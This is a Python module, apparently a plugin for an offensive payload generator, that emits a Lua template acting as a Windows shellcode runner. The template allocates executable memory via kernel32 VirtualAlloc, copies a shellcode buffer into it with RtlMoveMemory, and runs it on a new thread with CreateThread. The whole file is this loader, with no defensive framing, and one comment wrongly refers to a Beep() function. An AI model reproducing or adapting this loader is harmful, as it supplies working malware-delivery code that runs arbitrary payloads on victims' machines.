from string import Template
from c.utils.functions import *
from common.utils.argumentparser import ArgumentParser

class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['local c = require "c"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return """
    {transformers}
    -- create a new Library instance to load the "kernel32.dll"
    local kernel32 = c.Library("kernel32.dll") 

    -- define the kernel32 Beep() function
    kernel32.VirtualAlloc = "(pLJJ)p"
    kernel32.RtlMoveMemory = "(ppL)"
    kernel32.CreateThread = "(pLppJp)L"
    kernel32.WaitForSingleObject = "(LJ)J"

    local address = kernel32.VirtualAlloc(c.NULL, 460, 0x3000, 0x40)
    local ptr = c.Pointer(shellcode[0])

    kernel32.RtlMoveMemory(address, ptr, 460)

    local thread = kernel32.CreateThread(c.NULL, 0, address, c.NULL, 0, c.NULL)
    kernel32.WaitForSingleObject(thread, 0xffffffff)
"""